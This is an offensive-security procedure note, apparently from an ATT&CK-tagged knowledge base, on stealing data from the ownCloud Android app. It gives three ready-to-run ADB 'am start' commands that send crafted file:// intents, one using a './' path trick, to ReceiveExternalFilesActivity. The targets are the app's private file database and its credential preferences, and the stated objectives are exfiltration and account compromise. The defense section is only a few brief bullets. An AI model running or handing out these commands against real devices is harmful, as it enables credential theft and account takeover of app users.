---
tags:
  - android
  - exploitation
  - data-theft
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/adb-send-intent-to-filelist-db]]'
  - '[[commands/adb-send-intent-to-preferences-xml]]'
  - '[[commands/adb-send-intent-to-filelist-debug]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Data from Local System]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:24:45.276Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: ce24515c-9fae-4990-8aa7-9e7be4e5bf33
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Local System]]'
  - '[[Unsecured Credentials]]'
---
# Send Intent to Steal Sensitive Data

## Summary

This procedure sends the crafted intent to the ownCloud app's ReceiveExternalFilesActivity via ADB or another app, causing it to read and potentially exfiltrate sensitive internal files like databases and credential preferences.

## Description

Using ADB shell's 'am start' command, the intent is launched with the malicious URI, exploiting the lack of path validation. This forces the activity to process the file, which may lead to upload or exposure. Variants target different files and package names (e.g., debug build). The attack works on non-rooted devices with USB debugging.

## Requirements

1. ADB installed and device connected with debugging enabled
2. ownCloud app installed (v2.8.0 or below)
3. Crafted intent URI ready

## Defense

Defensive measures and detection strategies:

- Patch the app to validate URIs (restrict to content:// or external paths)
- Monitor ADB usage and unusual intent launches via device logs
- Use mobile security frameworks like Mobile Security Framework (MobSF) for app vetting

## Objectives

1. Trigger the activity to access private files
2. Exfiltrate data such as credentials or file history
3. Achieve account compromise

## Instructions

### Step 1: Send Intent for Database Access

**Context**: Target the filelist database to steal file history.

**Command** ([[commands/adb-send-intent-to-filelist-db]]):
```bash
adb shell am start -n com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/user/0/com.owncloud.android/databases/filelist"
```

> Launches the activity; monitor with 'adb logcat' for processing logs. Expected: File read and possibly uploaded.

### Step 2: Send Intent for Preferences Access

**Context**: Steal account credentials from shared preferences using a dotted path.

**Command** ([[commands/adb-send-intent-to-preferences-xml]]):
```bash
adb shell am start -n com.owncloud.android/.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/data/./com.owncloud.android/shared_prefs/com.owncloud.android_preferences.xml"
```

> The dot (./) is normalized, allowing access. Expected: Preferences XML contents exposed.

### Step 3: Test with Debug Package

**Context**: Verify on debug build if needed.

**Command** ([[commands/adb-send-intent-to-filelist-debug]]):
```bash
adb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t "text/plain" --grant-read-uri-permission -a "android.intent.action.SEND" --eu "android.intent.extra.STREAM" "file:///data/data/com.owncloud.android/databases/filelist"
```

> For reproduction in debug mode. Expected: Successful launch and file access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Data from Local System]] Data from Local System
- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/adb-send-intent-to-filelist-db]]
- [[commands/adb-send-intent-to-preferences-xml]]
- [[commands/adb-send-intent-to-filelist-debug]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- exploitation
